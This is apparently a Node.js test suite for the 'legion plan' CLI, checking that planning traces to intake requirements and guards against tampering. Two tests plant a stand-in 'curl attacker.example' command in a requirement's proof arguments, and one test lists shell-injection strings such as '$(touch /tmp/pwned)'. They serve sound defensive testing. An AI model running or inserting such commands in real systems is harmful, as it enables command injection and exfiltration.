import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

import { parseJsonOutput, runCliCapture } from "./helpers/cli-runner.mjs";

/**
 * Planning against the requirement set the interview produced.
 *
 * `legion plan` minted its own `req_phase-*` ID and authored generic criteria,
 * so the typed contract intake had just written was not what got planned: the
 * executable acceptance proofs the operator supplied were replaced with
 * generated prose, and nothing downstream traced back to the requirement set.
 *
 * These tests were written before the code that satisfies them, and confirmed
 * failing first. Three features in the previous phase were written, persisted,
 * and never consumed — each looked finished because the write side worked.
 */

const CREATED_AT = "2026-07-30T12:00:00.000Z";

const ANSWERS = {
  "project-name": "Asset Mapper",
  "project-summary": "Deterministic asset resolution.",
  "project-owner": "dasbl",
  "problem-statement": "Renames silently break downstream builds.",
  "problem-users": "Pipeline engineers.",
  "problem-success": "A broken reference fails at build time, loudly.",
  "req-1-statement": "Resolution fails loudly when an asset is missing",
  "req-1-priority": "must",
  "req-1-category": "behavior",
  "req-1-ac-1-statement": "Resolving a missing asset exits non-zero",
  "req-1-ac-1-proof": "executable",
  "req-1-ac-1-detail": "pnpm test --filter resolver",
  "req-1-ac-1-more": "true",
  "req-1-ac-2-statement": "The error names the referencing file",
  "req-1-ac-2-proof": "manual",
  "req-1-ac-2-detail": "Message wording is a judgement call that no assertion should freeze.",
  "req-1-ac-2-more": "false",
  "req-1-more": "false",
  "non-goals": "Automatic renaming",
  constraints: "TypeScript only",
  "risk-tier": "R2",
  "risk-reason": "Every downstream consumer is affected.",
  "budget-files": "12",
  "budget-lines": "600",
  "budget-new-files": "4",
  "pref-verification": "pnpm test"
};

function git(root, args) {
  execFileSync("git", ["-C", root, ...args], { stdio: ["ignore", "pipe", "ignore"] });
}

async function plannedProject(t, answers = ANSWERS) {
  const root = await mkdtemp(path.join(tmpdir(), "legion-plan-req-"));
  t.after(() => rm(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }));
  git(root, ["init", "--initial-branch=main"]);
  git(root, ["config", "user.email", "test@example.com"]);
  git(root, ["config", "user.name", "Test"]);
  git(root, ["config", "core.autocrlf", "false"]);

  const run = (...args) => runCliCapture(["--repository-root", root, ...args]);
  // Keys set to `undefined` mean "not asked", so they are removed rather than
  // serialized as null, which the batch entrance rightly refuses.
  const supplied = Object.fromEntries(
    Object.entries(answers).filter(([, value]) => value !== undefined)
  );
  await writeFile(path.join(root, "intake.json"), JSON.stringify(supplied), "utf8");
  await run("start", "--intake", "intake.json", "--created-at", CREATED_AT);
  const finalize = await run("start", "--finalize", "--json", "--created-at", CREATED_AT);
  assert.equal(finalize.exitCode, 0, finalize.stderr);

  git(root, ["add", "-A"]);
  git(root, ["commit", "-m", "intake"]);

  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 0, planned.stderr);

  const payload = parseJsonOutput(planned);
  const readText = async (relative) => readFile(path.join(root, ...relative.split("/")), "utf8");

  return {
    root,
    run,
    requirementId: parseJsonOutput(finalize).requirementSet.paths[0]
      .split("/")
      .at(-1)
      .replace(/\.json$/, ""),
    taskgraph: JSON.parse(await readText(payload.taskgraph.artifactPath)),
    // The oracle is YAML, so it is asserted as text rather than parsed. The
    // assertions are about which criteria appear, which reads the same either
    // way and avoids adding a parser to the test suite.
    oracle: await readText(payload.oracle.artifactPath)
  };
}

/** A finalized project, without planning it — for tests that break it first. */
async function scratchProject(t, answers = ANSWERS) {
  const root = await mkdtemp(path.join(tmpdir(), "legion-plan-scratch-"));
  t.after(() => rm(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }));
  git(root, ["init", "--initial-branch=main"]);
  git(root, ["config", "user.email", "test@example.com"]);
  git(root, ["config", "user.name", "Test"]);
  git(root, ["config", "core.autocrlf", "false"]);

  const run = (...args) => runCliCapture(["--repository-root", root, ...args]);
  const supplied = Object.fromEntries(
    Object.entries(answers).filter(([, value]) => value !== undefined)
  );
  await writeFile(path.join(root, "intake.json"), JSON.stringify(supplied), "utf8");
  await run("start", "--intake", "intake.json", "--created-at", CREATED_AT);
  return { root, run };
}

test("the planned task traces to the requirement the interview wrote", async (t) => {
  const { taskgraph, requirementId } = await plannedProject(t);
  const task = taskgraph.tasks[0];

  // `phasePlanIds` minted `req_<phase-suffix>` regardless of what the roadmap
  // named, so the contract traced to a requirement nobody authored.
  assert.deepEqual(
    task.requirementIds,
    [requirementId],
    `expected the intake requirement, got ${task.requirementIds.join(", ")}`
  );
});

test("the oracle covers the interview's real acceptance criteria", async (t) => {
  const { oracle, requirementId } = await plannedProject(t);

  assert.match(oracle, new RegExp(requirementId), "the oracle must cover the intake requirement");

  // Previously a single line of prose: "Phase N acceptance criteria are
  // satisfied" — which is not a criterion, it is the phase restated as its own
  // answer, and it made every oracle indistinguishable from every other.
  assert.match(oracle, /Resolving a missing asset exits non-zero/);
  assert.match(oracle, /names the referencing file/);
  assert.doesNotMatch(oracle, /Phase 1 acceptance criteria are satisfied/);
});

test("an executable criterion becomes task verification", async (t) => {
  const { taskgraph } = await plannedProject(t);
  const commands = taskgraph.tasks[0].verification.map(
    (entry) => `${entry.command} ${entry.args.join(" ")}`.trim()
  );

  // The criterion the operator said decides this requirement has to be the
  // thing that runs. Verifying only the project-wide command would check that
  // nothing broke, not that the requirement holds.
  assert.ok(
    commands.some((entry) => entry === "pnpm test --filter resolver"),
    `expected the criterion command, got ${JSON.stringify(commands)}`
  );
});

test("a manual criterion is carried as an unproven gap, not as a command", async (t) => {
  const { oracle } = await plannedProject(t);

  // A manual criterion cannot be executed, and inventing a command for it would
  // be the fabrication the protocol revision exists to prevent. It stays visible
  // as unproven, named for whoever reviews the phase.
  assert.match(oracle, /judgement call/);
  assert.match(oracle, /no command can decide/i);
});

test("planning a project with no requirement set still works", async (t) => {
  const root = await mkdtemp(path.join(tmpdir(), "legion-plan-bare-"));
  t.after(() => rm(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }));
  git(root, ["init", "--initial-branch=main"]);
  git(root, ["config", "user.email", "test@example.com"]);
  git(root, ["config", "user.name", "Test"]);

  const run = (...args) => runCliCapture(["--repository-root", root, ...args]);
  await run("start", "--name", "Bare Project", "--owner", "dasbl");
  await writeFile(path.join(root, "ROADMAP.md"), "## Phase 1: Foundation\n\n- Build it\n", "utf8");
  git(root, ["add", "-A"]);
  git(root, ["commit", "-m", "init"]);

  // Direct initialization and the legacy `.planning` importer both produce
  // roadmaps with no requirement IDs. Planning must keep working for them
  // rather than requiring an interview that never happened.
  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 0, planned.stderr);
  const taskgraph = JSON.parse(
    await readFile(
      path.join(root, ...parseJsonOutput(planned).taskgraph.artifactPath.split("/")),
      "utf8"
    )
  );
  assert.equal(taskgraph.tasks.length, 1);
});

test("a maximum-length criterion still plans", async (t) => {
  // Intake accepts a criterion statement of exactly 1024 characters, and the
  // oracle caps its rendered coverage at 1024 too — so appending the proof
  // description overflowed and `oracleSchema.parse` threw, after the current
  // spec and change bundle were already written. A schema-valid interview could
  // not be planned and left partial artifacts behind.
  const statement = `A${"x".repeat(1_022)}Z`;
  assert.equal(statement.length, 1_024);

  const { taskgraph, oracle } = await plannedProject(t, {
    ...ANSWERS,
    "req-1-ac-1-statement": statement,
    "req-1-ac-1-more": "false",
    "req-1-ac-2-statement": undefined,
    "req-1-ac-2-proof": undefined,
    "req-1-ac-2-detail": undefined,
    "req-1-ac-2-more": undefined
  });

  // Planning completing at all is the assertion: it previously threw from
  // `oracleSchema.parse` after the spec and change bundle were already written.
  assert.equal(taskgraph.tasks.length, 1);

  // The criterion is still identifiable from what survives, and the truncation
  // is marked rather than silent.
  assert.match(oracle, /Axxx/);
  assert.match(oracle, /…/);
});

test("a rendered criterion never exceeds the oracle's field limit", async () => {
  const { describeCriterion, MAX_CRITERION_DESCRIPTION } = await import(
    "../packages/cli/dist/workflow/phase-requirement.js"
  );

  // Asserted directly rather than through the artifact: a YAML document has
  // long lines for unrelated reasons, so reading the limit off the file would
  // pass or fail for the wrong cause.
  const executable = describeCriterion({
    id: "ac_long-1",
    statement: "x".repeat(1_024),
    proof: { mode: "executable", command: "pnpm", args: ["test"], expectedExitCode: 0 }
  });
  const manual = describeCriterion({
    id: "ac_long-2",
    statement: "y".repeat(1_024),
    proof: { mode: "manual", reason: "z".repeat(1_024) }
  });

  assert.ok(executable.length <= MAX_CRITERION_DESCRIPTION, `${executable.length} characters`);
  assert.ok(manual.length <= MAX_CRITERION_DESCRIPTION, `${manual.length} characters`);

  // Ordinary input must not be reshaped by the clamp.
  assert.equal(
    describeCriterion({
      id: "ac_short-1",
      statement: "Resolving a missing asset exits non-zero",
      proof: { mode: "executable", command: "pnpm", args: ["test"], expectedExitCode: 0 }
    }),
    'Resolving a missing asset exits non-zero — run "pnpm" with arguments ["test"]; it must exit 0'
  );
});

test("a criterion expecting a non-zero exit does not suppress the project check", async () => {
  const { phaseVerification } = await import(
    "../packages/cli/dist/workflow/taskgraph-input.js"
  );

  // Unreachable through intake, which pins every criterion to exit 0 — so this
  // exercises the unit directly. Driving it through an interview would pass
  // whether or not the exit code were part of the identity, which is no test.
  const criterion = (expectedExitCode) => ({
    id: "ac_same-command-1",
    statement: "The suite reports the expected outcome",
    proof: { mode: "executable", command: "pnpm", args: ["test"], expectedExitCode }
  });
  const enforcement = {
    risk: { tier: "R2", reason: "x" },
    budget: { maxFilesChanged: 12, maxLinesChanged: 600, maxNewFiles: 4 },
    verification: { command: "pnpm", args: ["test"] }
  };
  const render = (entries) =>
    entries.map((entry) => `${entry.command} ${entry.args.join(" ")} => ${entry.expectedExitCode}`);

  // Different expectation for the same command: keyed on command alone, the
  // criterion asserting exit 1 removed the project check asserting exit 0, so a
  // failing regression suite satisfied the task.
  const differing = render(
    phaseVerification({
      enforcement,
      requirement: { requirement: {}, executable: [criterion(1)], manual: [] }
    })
  );
  assert.deepEqual(differing, ["pnpm test => 1", "pnpm test => 0"]);

  // Identical command and expectation still collapses: one proof should not be
  // run twice and counted as two.
  const identical = render(
    phaseVerification({
      enforcement,
      requirement: { requirement: {}, executable: [criterion(0)], manual: [] }
    })
  );
  assert.deepEqual(identical, ["pnpm test => 0"]);

  // Argument boundaries have to survive the identity too. Joining on spaces made
  // `node -e "foo bar"` and `node -e foo bar` indistinguishable, so one
  // suppressed the other even though the runner executes different commands.
  const boundaries = phaseVerification({
    enforcement: { ...enforcement, verification: { command: "node", args: ["-e", "foo", "bar"] } },
    requirement: {
      requirement: {},
      executable: [
        {
          id: "ac_quoted-1",
          statement: "The quoted form runs",
          proof: { mode: "executable", command: "node", args: ["-e", "foo bar"], expectedExitCode: 0 }
        }
      ],
      manual: []
    }
  });
  assert.deepEqual(
    boundaries.map((entry) => entry.args),
    [["-e", "foo bar"], ["-e", "foo", "bar"]],
    "distinct argument vectors must both survive"
  );
});

test("planning refuses a requirement edited after it was written", async (t) => {
  const { root, run } = await scratchProject(t);
  const finalize = parseJsonOutput(
    await run("start", "--finalize", "--json", "--created-at", CREATED_AT)
  );

  // Schema-valid, so `readRequirementSet` succeeds — but the recorded hash no
  // longer matches. Planning would copy this command into the task contract and
  // `legion build` would run it. `validate` and `doctor` both detect the state;
  // the path that actually consumes the content did not.
  const requirementPath = path.join(root, ...finalize.requirementSet.paths[0].split("/"));
  const requirement = JSON.parse(await readFile(requirementPath, "utf8"));
  requirement.acceptance.criteria[0].proof.args = ["--", "curl", "attacker.example"];
  await writeFile(requirementPath, `${JSON.stringify(requirement, undefined, 2)}\n`, "utf8");

  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 1, "an edited requirement must not be planned against");
  const payload = parseJsonOutput(planned);
  assert.equal(payload.status, "requirement_set_drift");
  assert.ok(payload.diagnostics.some((entry) => /requirement/.test(entry.code)));
});

test("aggregate review instructions stay inside the oracle limit", async () => {
  const { buildOracleArtifactInput } = await import(
    "../packages/cli/dist/workflow/oracle-input.js"
  );

  // Twenty manual criteria is a schema-valid interview: intake permits that many
  // and each is bounded at 1024. Clamping the elements without bounding the sum
  // left the joined instructions over the 4096-character limit, so the oracle
  // threw after the spec and change bundle were already on disk.
  const manual = Array.from({ length: 20 }, (_, index) => ({
    id: `ac_manual-${index + 1}`,
    statement: `Criterion ${index + 1}: ${"w".repeat(400)}`,
    proof: { mode: "manual", reason: "z".repeat(500) }
  }));

  const input = buildOracleArtifactInput({
    repositoryRoot: process.cwd(),
    project: {
      id: "prj_asset-mapper",
      policy: { decisionOwners: [{ kind: "human", id: "dasbl", displayName: "dasbl" }] }
    },
    phase: { number: 1, name: "Foundation", body: "", sourcePath: "ROADMAP.md" },
    change: {
      artifactPath: ".legion/project/changes/chg_x/change.yaml",
      reference: { path: ".legion/project/changes/chg_x/change.yaml", sha256: `sha256:${"0".repeat(64)}` }
    },
    requirement: {
      requirement: { id: "req_many-manual-criteria", acceptance: { criteria: manual } },
      executable: [],
      manual
    },
    baseGitSha: "0".repeat(40),
    createdAt: CREATED_AT
  });

  const instructions = input.oracle.execution.instructions;
  assert.ok(instructions.length <= 4_096, `instructions were ${instructions.length} characters`);
  // Omission is stated, not silent: a criterion that vanished from the review
  // instructions is the gap this section exists to surface.
  assert.match(instructions, /and \d+ more, listed in req_many-manual-criteria\./);
});

test("the spec self-anchor predicate matches what createCurrentSpec requires", async () => {
  const { buildPhaseCurrentSpecInput } = await import(
    "../packages/cli/dist/workflow/change-input.js"
  );

  const specPath = ".legion/project/specs/req_imported-requirement.md";
  const base = {
    schemaVersion: "0.2.0",
    createdAt: CREATED_AT,
    kind: "requirement",
    id: "req_imported-requirement",
    projectId: "prj_asset-mapper",
    status: "accepted",
    priority: "must",
    category: "behavior",
    statement: "An imported requirement",
    acceptance: {
      language: "An imported requirement",
      criteria: [
        { id: "ac_one-1", statement: "It holds", proof: { mode: "manual", reason: "Judgement." } }
      ],
      oracleRefs: ["orc_pre-existing-coverage"]
    },
    supersedes: []
  };

  // Right path, anchor and relation, but no entity. `createCurrentSpec` requires
  // the entity too, so treating this as anchored produced a document it then
  // rejected as `missing_stable_anchor` — a valid requirement set that could not
  // be planned.
  const input = buildPhaseCurrentSpecInput({
    repositoryRoot: process.cwd(),
    project: { id: "prj_asset-mapper" },
    phase: { number: 1, name: "Foundation", body: "", sourcePath: "ROADMAP.md" },
    requirement: {
      ...base,
      traceRefs: [{ path: specPath, anchor: "req_imported-requirement", relation: "defines" }]
    },
    createdAt: CREATED_AT
  });

  const placed = input.document.requirements[0];
  assert.ok(
    placed.traceRefs.some(
      (ref) =>
        ref.path === specPath &&
        ref.anchor === "req_imported-requirement" &&
        ref.relation === "defines" &&
        ref.entity?.kind === "requirement" &&
        ref.entity.id === "req_imported-requirement"
    ),
    `the entity-bearing anchor must be added: ${JSON.stringify(placed.traceRefs)}`
  );
});

test("a proposed requirement carries only the oracle this change can resolve", async () => {
  const { buildChangeBundleInput } = await import(
    "../packages/cli/dist/workflow/change-input.js"
  );

  // Retaining an imported requirement's earlier oracle IDs was implemented and
  // then reverted: `validateChangeTraceability` loads only the current change's
  // oracle manifest, so every retained ID reports `missing_oracle_artifact` and
  // archive refuses the change outright. Preserving coverage properly needs
  // cross-change oracle resolution.
  //
  // Nothing shipped produces a requirement with prior refs — intake writes
  // `oracleRefs: []` — so this loses no coverage today. The test pins the
  // decision so the trade is deliberate rather than rediscovered.
  const input = buildChangeBundleInput({
    repositoryRoot: process.cwd(),
    project: { id: "prj_asset-mapper", policy: { decisionOwners: [{ kind: "human", id: "dasbl" }] } },
    phase: { number: 1, name: "Foundation", body: "Body", sourcePath: "ROADMAP.md" },
    currentSpec: { document: { primaryRequirementId: "req_imported-requirement", revision: 1 } },
    requirement: {
      schemaVersion: "0.2.0",
      createdAt: CREATED_AT,
      kind: "requirement",
      id: "req_imported-requirement",
      projectId: "prj_asset-mapper",
      status: "accepted",
      priority: "must",
      category: "behavior",
      statement: "An imported requirement",
      acceptance: {
        language: "An imported requirement",
        criteria: [
          { id: "ac_one-1", statement: "It holds", proof: { mode: "manual", reason: "Judgement." } }
        ],
        oracleRefs: ["orc_pre-existing-coverage"]
      },
      traceRefs: [
        {
          path: ".legion/project/specs/req_imported-requirement.md",
          anchor: "req_imported-requirement",
          relation: "defines",
          entity: { kind: "requirement", id: "req_imported-requirement" }
        }
      ],
      supersedes: []
    },
    baseGitSha: "0".repeat(40),
    createdAt: CREATED_AT
  });

  assert.deepEqual(
    input.deltaSpecs[0].proposedRequirement.acceptance.oracleRefs,
    ["orc_phase-1-foundation"]
  );
});

test("a CRLF checkout of an unchanged project still plans", async (t) => {
  const { root, run } = await scratchProject(t);
  const finalize = parseJsonOutput(
    await run("start", "--finalize", "--json", "--created-at", CREATED_AT)
  );

  // `core.autocrlf=true` is the Windows default, so a fresh clone rewrites these
  // LF files to CRLF. Once planning began enforcing drift, that made every plan
  // fail on a project nobody had touched — the guard firing on the checkout
  // rather than on a change.
  for (const relative of finalize.requirementSet.paths) {
    const absolute = path.join(root, ...relative.split("/"));
    const contents = await readFile(absolute, "utf8");
    await writeFile(absolute, contents.replace(/\r?\n/g, "\r\n"), "utf8");
  }
  const indexPath = path.join(root, ".legion/project/requirements/index.json");
  await writeFile(
    indexPath,
    (await readFile(indexPath, "utf8")).replace(/\r?\n/g, "\r\n"),
    "utf8"
  );

  assert.equal((await run("validate", "--json")).exitCode, 0, "line endings are not a change");
  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 0, planned.stderr);

  // The guard must still fire on an actual edit, so normalizing must not have
  // blunted it.
  const requirementPath = path.join(root, ...finalize.requirementSet.paths[0].split("/"));
  const requirement = JSON.parse(await readFile(requirementPath, "utf8"));
  requirement.statement = "Something nobody agreed to";
  await writeFile(requirementPath, `${JSON.stringify(requirement, undefined, 2)}\r\n`, "utf8");
  assert.equal((await run("validate", "--json")).exitCode, 1, "a real edit is still drift");
});

test("verification identity covers every field the runner acts on", async () => {
  const { phaseVerification } = await import(
    "../packages/cli/dist/workflow/taskgraph-input.js"
  );

  // This key has been wrong three times — exit code, argument boundaries, then
  // timeout — each a field the runner acts on that the identity excluded, and
  // each fix added one more field while leaving the next one out. Two entries
  // are the same proof exactly when they are the same entry.
  const enforcement = {
    risk: { tier: "R2", reason: "x" },
    budget: { maxFilesChanged: 1, maxLinesChanged: 1, maxNewFiles: 0 },
    verification: { command: "pnpm", args: ["test"] }
  };
  const criterion = (overrides) => ({
    id: "ac_same-1",
    statement: "s",
    proof: { mode: "executable", command: "pnpm", args: ["test"], expectedExitCode: 0, ...overrides }
  });

  // The project entry uses 600_000ms; a criterion differing only in timeout must
  // not replace it, because the runner applies each entry's timeout
  // independently and a one-second criterion would fail a ten-minute suite.
  const differingTimeout = phaseVerification({
    enforcement,
    requirement: { requirement: {}, executable: [criterion({ timeoutMs: 1_000 })], manual: [] }
  });
  assert.equal(differingTimeout.length, 2, JSON.stringify(differingTimeout));

  // Genuinely identical entries still collapse.
  const identical = phaseVerification({
    enforcement,
    requirement: { requirement: {}, executable: [criterion({ timeoutMs: 600_000 })], manual: [] }
  });
  assert.equal(identical.length, 1, JSON.stringify(identical));
});

test("planning consumes the requirement snapshot it verified", async (t) => {
  const { root, run } = await scratchProject(t);
  const finalize = parseJsonOutput(
    await run("start", "--finalize", "--json", "--created-at", CREATED_AT)
  );

  // A second independent read is a second snapshot. This asserts the outcome
  // that depends on there being only one: an edited command is refused rather
  // than reaching the contract between the check and the consumption.
  const requirementPath = path.join(root, ...finalize.requirementSet.paths[0].split("/"));
  const requirement = JSON.parse(await readFile(requirementPath, "utf8"));
  requirement.acceptance.criteria[0].proof.args = ["--", "curl", "attacker.example"];
  await writeFile(requirementPath, `${JSON.stringify(requirement, undefined, 2)}
`, "utf8");

  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 1);
  assert.equal(parseJsonOutput(planned).status, "requirement_set_drift");

  // Refusal has to happen before any planning artifact exists, or the untrusted
  // command would already be on disk for the next command to pick up.
  //
  // The previous assertion here searched `index.json` for the command and was
  // vacuous twice over: the index stores only hashes, IDs and paths by schema,
  // and in the refusal path the changes directory does not exist so the searched
  // text was empty. It could not have matched for the reason it claimed.
  assert.equal(
    existsSync(path.join(root, ".legion/project/changes")),
    false,
    "no change artifacts may be written when planning refuses"
  );
});

test("a rendered command states the argv vector rather than a shell line", async () => {
  const { describeCriterion } = await import(
    "../packages/cli/dist/workflow/phase-requirement.js"
  );

  const describe = (args) =>
    describeCriterion({
      id: "ac_argv-1",
      statement: "s",
      proof: { mode: "executable", command: "node", args, expectedExitCode: 0 }
    });

  // Five rounds of review went into quoting this text for a shell, ending with
  // "POSIX single-quote escaping is wrong in PowerShell". That was not another
  // missing case — it is proof that no single string is correct in every shell,
  // so a rendering that claims to be shell-pasteable cannot keep the promise.
  //
  // The runner receives the argv vector directly and never parses this text, so
  // the text only has to say unambiguously what the vector was.
  assert.notEqual(
    describe(["-e", "foo bar"]),
    describe(["-e", "foo", "bar"]),
    "argument boundaries must be distinguishable"
  );
  assert.notEqual(describe([""]), describe([]), "an empty argument is not no arguments");

  // Nothing in the rendering can be mistaken for shell syntax, whichever shell
  // the reviewer uses.
  for (const hostile of ["$(touch /tmp/pwned)", "`id`", "$HOME", "a;b", "a&&b", "O'Brien", 'say "hi"']) {
    const rendered = describe([hostile]);
    assert.ok(
      rendered.includes(JSON.stringify([hostile])),
      `${hostile} must appear as data: ${rendered}`
    );
  }

  assert.match(describe([]), /with no arguments/);
});

test("a phase naming a declined requirement is refused", async (t) => {
  // A `wont` requirement is kept in the set but excluded from roadmap phases, so
  // reaching this state means the roadmap was hand-edited or is stale. The
  // roadmap is edited here rather than the requirement, because editing the
  // requirement would trip drift detection first and test the wrong guard.
  const { root, run } = await scratchProject(t, {
    ...ANSWERS,
    "req-1-ac-1-more": "false",
    "req-1-ac-2-statement": undefined,
    "req-1-ac-2-proof": undefined,
    "req-1-ac-2-detail": undefined,
    "req-1-ac-2-more": undefined,
    "req-1-more": "true",
    "req-2-statement": "Rewriting history to hide a broken reference",
    "req-2-priority": "wont",
    "req-2-category": "constraint",
    "req-2-more": "false"
  });
  const finalize = parseJsonOutput(
    await run("start", "--finalize", "--json", "--created-at", CREATED_AT)
  );

  const declined = finalize.requirementSet.paths
    .map((entry) => entry.split("/").at(-1).replace(/\.json$/, ""))
    .find((id) => id.startsWith("req_rewriting-history"));
  assert.ok(declined !== undefined, finalize.requirementSet.paths.join(", "));

  const roadmapPath = path.join(root, "ROADMAP.md");
  const roadmap = await readFile(roadmapPath, "utf8");
  await writeFile(
    roadmapPath,
    roadmap.replace(/\*\*Requirement:\*\* `req_[^`]+`/, `**Requirement:** \`${declined}\``),
    "utf8"
  );

  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 1, "a declined requirement must not be planned");
  assert.match(parseJsonOutput(planned).diagnostics[0].message, /out of scope/i);
});

test("a requirement set from another project is refused", async (t) => {
  const { root, run } = await scratchProject(t);
  await run("start", "--finalize", "--json", "--created-at", CREATED_AT);

  // Hash-consistent with itself says nothing about whose project it describes.
  // A set copied from another repository validates cleanly, and planning would
  // embed a foreign requirement and run its executable criteria here.
  const indexPath = path.join(root, ".legion/project/requirements/index.json");
  const index = JSON.parse(await readFile(indexPath, "utf8"));
  index.projectId = "prj_somebody-elses-project";
  await writeFile(indexPath, `${JSON.stringify(index, undefined, 2)}\n`, "utf8");

  const planned = await run("plan", "1", "--json");
  assert.equal(planned.exitCode, 1);
  assert.equal(parseJsonOutput(planned).status, "requirement_set_foreign");
  assert.match(parseJsonOutput(planned).diagnostics[0].message, /prj_somebody-elses-project/);
});
